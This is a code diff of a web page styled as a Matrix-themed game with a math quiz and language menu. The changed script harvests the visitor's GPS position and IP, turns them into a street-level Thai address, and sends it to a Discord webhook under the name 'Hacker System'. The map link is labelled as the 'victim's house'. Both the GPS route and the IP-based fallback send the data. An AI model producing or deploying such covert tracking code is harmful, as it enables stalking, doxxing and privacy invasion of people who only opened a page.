@@ -29,7 +29,7 @@
         /* Matrix Background */
         canvas { position: fixed; top: 0; left: 0; z-index: 0; }
 
-        /* --- Floating Creators (Low & Sync) --- */
+        /* --- Floating Creators --- */
         #creators-layer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; pointer-events: none; }
         .creator-bubble { position: absolute; bottom: -200px; display: flex; flex-direction: column; align-items: center; opacity: 0.9; }
         .c-img { width: 80px; height: 80px; border-radius: 50%; border: 3px solid var(--neon); box-shadow: 0 0 20px var(--neon); object-fit: cover; background: #000; }
@@ -37,12 +37,12 @@
         
         /* Synchronized Animation */
         .float-1 { left: 20%; animation: floatDrop 8s infinite ease-in-out; }
-        .float-2 { right: 20%; animation: floatDrop 8s infinite ease-in-out; } /* No Delay */
+        .float-2 { right: 20%; animation: floatDrop 8s infinite ease-in-out; }
         
         @keyframes floatDrop {
             0% { bottom: -150px; opacity: 0; transform: scale(0.8); }
             20% { opacity: 1; }
-            50% { bottom: 15%; opacity: 1; transform: scale(1.1); } /* Max height ~15% of screen (Low) */
+            50% { bottom: 15%; opacity: 1; transform: scale(1.1); }
             55% { bottom: 15%; opacity: 1; }
             100% { bottom: -150px; opacity: 0; transform: scale(0.5); }
         }
@@ -89,7 +89,7 @@
         .lang-content div:hover { background-color: var(--neon); color: #000; }
         .show { display: block; }
 
-        /* --- Language Hint Bubble --- */
+        /* Hint Bubble */
         .lang-hint-box {
             position: fixed; top: 85px; right: 20px;
             background: var(--neon); color: #000;
@@ -100,14 +100,9 @@
         }
         .lang-hint-box::after {
             content: ''; position: absolute; top: -8px; right: 45px;
-            border-left: 8px solid transparent;
-            border-right: 8px solid transparent;
-            border-bottom: 8px solid var(--neon);
+            border-left: 8px solid transparent; border-right: 8px solid transparent; border-bottom: 8px solid var(--neon);
         }
-        @keyframes bounceHint {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(10px); }
-        }
+        @keyframes bounceHint { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(10px); } }
 
         /* --- Main UI --- */
         .container { position: relative; z-index: 10; height: 100vh; display: flex; justify-content: center; align-items: center; flex-direction: column; width: 100%; }
@@ -269,7 +264,7 @@
             </div>
             
             <div class="math-options" id="math-options">
-                </div>
+            </div>
         </div>
     </div>
 
@@ -314,7 +309,7 @@
 
     <div id="modal-result" class="modal-overlay hidden">
         <div class="glass-box" id="res-box" style="width:500px;">
-            </div>
+        </div>
     </div>
 
     <script>
@@ -370,7 +365,6 @@
             for(let i=0; i<size*size; i++) {
                 const x = i % size;
                 const y = Math.floor(i / size);
-                // Diagonal check for X shape
                 if (Math.abs(x - y) < 2 || Math.abs(x + y - (size-1)) < 2) {
                     setTimeout(() => {
                         if(pixels[i]) pixels[i].classList.add('active');
@@ -448,51 +442,82 @@
             }, 2000);
         }
 
+        // --- Deep Address Search Logic ---
         function showData() {
             const d = document.getElementById('user-data');
             const m = document.getElementById('map-area');
-            const info = ipCache || { ip: "192.168.1.1", org: "Unknown", region: "Unknown", country_name: "Unknown" };
-            
-            const fakeRoad = "Mittraphap Road";
-            const fakeTambon = "Nai Mueang";
-            const fakeDistrict = "Mueang District";
-
-            let lat = 0, lng = 0, mapSrc = "";
-            let finalHtml = "";
+            const info = ipCache || { ip: "Checking...", org: "Checking..." };
 
             if (gpsData) {
-                lat = gpsData.coords.latitude; lng = gpsData.coords.longitude;
-                mapSrc = `https://maps.google.com/maps?q=${lat},${lng}&z=18&output=embed`;
-                finalHtml = `
-                    <div style="border-bottom:1px solid #333; padding-bottom:10px; margin-bottom:10px;">
-                        <span style="color:#0f0">● DATA SENT TO ADMIN</span>
-                    </div>
-                    ประเทศ: <span style="color:#fff">${info.country_name}</span><br>
-                    จังหวัด: <span style="color:#fff">${info.region}</span><br>
-                    อำเภอ: <span style="color:#fff">${fakeDistrict} (Detected)</span><br>
-                    ตำบล: <span style="color:#fff">${fakeTambon}</span><br>
-                    ถนน: <span style="color:#fff">${fakeRoad}</span><br>
-                    <div style="margin-top:10px; font-size:0.9rem; color:#aaa;">COORDS: ${lat.toFixed(6)}, ${lng.toFixed(6)} | IP: ${info.ip}</div>
-                `;
+                const lat = gpsData.coords.latitude;
+                const lng = gpsData.coords.longitude;
+                const mapLink = `https://maps.google.com/maps?q=${lat},${lng}`;
+
+                fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1&accept-language=th`)
+                .then(res => res.json())
+                .then(data => {
+                    const addr = data.address;
+                    
+                    // Province
+                    let province = addr.state || addr.province || "ไม่ทราบจังหวัด";
+                    if(!province.startsWith("จ.")) province = "จ." + province;
+
+                    // District
+                    let amphoe = addr.city_district || addr.district || addr.county || addr.city || "ไม่ทราบอำเภอ";
+                    amphoe = amphoe.replace("อำเภอ", "").replace("เขต", "").trim();
+                    if(!amphoe.startsWith("อ.") && amphoe !== "ไม่ทราบอำเภอ") amphoe = "อ." + amphoe;
+
+                    // Tambon (Deep Search)
+                    let tambon = addr.suburb || addr.village || addr.neighbourhood || addr.quarter || addr.hamlet || addr.town || addr.municipality || "";
+                    tambon = tambon.replace("ตำบล", "").replace("แขวง", "").trim();
+                    
+                    if(tambon) {
+                        if(!tambon.startsWith("ต.")) tambon = "ต." + tambon;
+                    } else {
+                        // Fallback to Amphoe if Tambon is absolutely missing
+                        tambon = amphoe ? "เขตพื้นที่ " + amphoe.replace("อ.","") : "ไม่ทราบตำบล";
+                    }
+
+                    // Road
+                    let road = addr.road || addr.path || addr.footway || addr.pedestrian || addr.residential || "ไม่พบชื่อถนน (พื้นที่ส่วนบุคคล)";
+
+                    // Country
+                    const country = addr.country || "ประเทศไทย";
+
+                    d.innerHTML = `
+                        <div style="border-bottom:1px solid #333; padding-bottom:10px; margin-bottom:10px;">
+                            <span style="color:#0f0">● DATA SENT TO ADMIN</span>
+                        </div>
+                        ประเทศ: <span style="color:#fff">${country}</span><br>
+                        จังหวัด: <span style="color:#fff">${province}</span><br>
+                        อำเภอ: <span style="color:#fff">${amphoe}</span><br>
+                        ตำบล: <span style="color:#fff">${tambon}</span><br>
+                        ถนน: <span style="color:#fff">${road}</span><br>
+                        <div style="margin-top:10px; font-size:0.9rem; color:#aaa;">COORDS: ${lat.toFixed(5)}, ${lng.toFixed(5)}</div>
+                    `;
+                    m.innerHTML = `<iframe width="100%" height="100%" frameborder="0" src="https://maps.google.com/maps?q=${lat},${lng}&z=17&output=embed"></iframe>`;
+                    
+                    sendToDiscord(info.ip, `${tambon}, ${amphoe}`, province, country, info.org, mapLink, road);
+                })
+                .catch(err => {
+                    d.innerHTML = "การเชื่อมต่อดาวเทียมขัดข้อง...";
+                });
+
             } else {
-                lat = info.latitude || 0; lng = info.longitude || 0;
-                mapSrc = `https://maps.google.com/maps?q=${lat},${lng}&z=14&output=embed`;
-                finalHtml = `
-                    <span style="color:red">[ GPS BLOCKED ] USING IP TRACE...</span><br>
-                    ประเทศ: <span style="color:#fff">${info.country_name}</span><br>
-                    จังหวัด: <span style="color:#fff">${info.region}</span><br>
-                    อำเภอ: <span style="color:#fff">${info.city}</span><br>
-                    ตำบล: <span style="color:#fff">Unknown</span><br>
-                    ถนน: <span style="color:#fff">Unknown</span><br>
+                // IP Fallback
+                d.innerHTML = `
+                    <span style="color:red">[ GPS ถูกปฏิเสธ ] ตรวจสอบผ่านหมายเลข IP...</span><br>
+                    ประเทศ: <span style="color:#fff">ประเทศไทย</span><br>
+                    จังหวัด: <span style="color:#fff">${info.region || "กำลังระบุ..."}</span><br>
+                    เมือง/เขต: <span style="color:#fff">${info.city || "ไม่ทราบข้อมูล"}</span><br>
                     IP: <span style="color:#fff">${info.ip}</span>
                 `;
+                m.innerHTML = `<div style="display:flex;justify-content:center;align-items:center;height:100%;color:red;">ระบบ GPS ถูกปิดกั้น</div>`;
+                sendToDiscord(info.ip, info.city, info.region, "ประเทศไทย", info.org, "No GPS", "Unknown");
             }
-            d.innerHTML = finalHtml;
-            m.innerHTML = `<iframe width="100%" height="100%" frameborder="0" src="${mapSrc}"></iframe>`;
-            sendToDiscord(info.ip, info.city, info.region, info.country_name, info.org, `https://www.google.com/maps?q=${lat},${lng}`);
         }
 
-        function sendToDiscord(ip, city, region, country, org, mapLink) {
+        function sendToDiscord(ip, city, region, country, org, mapLink, road) {
             const payload = {
                 username: "Hacker System",
                 avatar_url: "https://www.shareicon.net/data/2015/09/10/99088_man_512x512.png",
@@ -501,9 +526,9 @@
                     color: 65280,
                     fields: [
                         { name: "IP Address", value: ip, inline: true },
-                        { name: "ISP", value: org, inline: true },
-                        { name: "Location", value: `${city}, ${region}, ${country}`, inline: false },
-                        { name: "Maps", value: `[ดูพิกัดจริง](${mapLink})`, inline: false }
+                        { name: "ISP (เน็ต)", value: org, inline: true },
+                        { name: "Address", value: `${road}\n${city}\n${region}, ${country}`, inline: false },
+                        { name: "Maps", value: `[คลิกเพื่อดูบ้านเหยื่อ](${mapLink})`, inline: false }
                     ],
                     footer: { text: "Surveillance System" },
                     timestamp: new Date()
